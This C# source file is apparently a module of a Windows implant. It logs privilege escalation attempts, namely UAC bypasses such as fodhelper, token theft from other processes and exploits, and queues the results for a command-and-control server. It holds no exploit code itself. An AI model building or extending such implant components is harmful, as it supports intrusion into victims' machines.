using System;
using System.Collections.Generic;
using System.Security.Principal;

namespace XYZ.modules.reporters
{
    /// <summary>
    /// Reports privilege escalation attempts to C2
    /// </summary>
    public class PrivilegeEscalationReporter
    {
        public const string REPORT_TYPE = "privilege_escalation_attempt";

        /// <summary>
        /// Report a privilege escalation attempt
        /// </summary>
        /// <param name="technique">Technique used: fodhelper, token_theft, exploit_name, etc</param>
        /// <param name="initialLevel">Starting privilege level</param>
        /// <param name="targetLevel">Desired privilege level</param>
        /// <param name="achievedLevel">Actually achieved level (if any)</param>
        /// <param name="success">Whether escalation succeeded</param>
        /// <param name="errorMessage">Error message if failed</param>
        /// <param name="details">Additional details (e.g., process stolen from)</param>
        public static void Report(string technique, string initialLevel, string targetLevel,
            string achievedLevel, bool success, string errorMessage = null, 
            Dictionary<string, object> details = null)
        {
            var data = new Dictionary<string, object>
            {
                { "technique", technique },
                { "initial_level", initialLevel },
                { "target_level", targetLevel },
                { "achieved_level", achievedLevel },
                { "success", success },
                { "error_message", errorMessage },
                { "details", details },
                { "attempted_at", DateTime.UtcNow.ToString("o") }
            };

            TelemetryAggregator.QueueReport(REPORT_TYPE, data);

            string status = success ? "SUCCESS" : "FAILED";
            SecureLogger.LogInfo("PrivilegeEscalationReporter",
                string.Format("Escalation [{0}] {1}: {2} -> {3}", technique, status, initialLevel, achievedLevel ?? "N/A"));
        }

        /// <summary>
        /// Get current privilege level as string
        /// </summary>
        public static string GetCurrentPrivilegeLevel()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);

                if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    // Check if running as SYSTEM
                    if (identity.Name.ToUpper().Contains("SYSTEM"))
                        return "System";
                    return "Admin";
                }
                return "User";
            }
            catch
            {
                return "Unknown";
            }
        }

        /// <summary>
        /// Report token theft attempt
        /// </summary>
        public static void ReportTokenTheft(int targetProcessId, string targetProcessName, 
            bool success, string error = null)
        {
            var details = new Dictionary<string, object>
            {
                { "target_process_id", targetProcessId },
                { "target_process_name", targetProcessName }
            };

            string initial = GetCurrentPrivilegeLevel();
            Report("token_theft", initial, "System", success ? "System" : initial, success, error, details);
        }

        /// <summary>
        /// Report UAC bypass attempt
        /// </summary>
        public static void ReportUACBypass(string method, bool success, string error = null)
        {
            string initial = GetCurrentPrivilegeLevel();
            Report(string.Format("uac_bypass_{0}", method), initial, "Admin", 
                success ? "Admin" : initial, success, error);
        }

        /// <summary>
        /// Report exploit attempt
        /// </summary>
        public static void ReportExploit(string exploitName, bool success, string error = null)
        {
            string initial = GetCurrentPrivilegeLevel();
            Report(string.Format("exploit_{0}", exploitName), initial, "System",
                success ? "System" : initial, success, error);
        }
    }
}
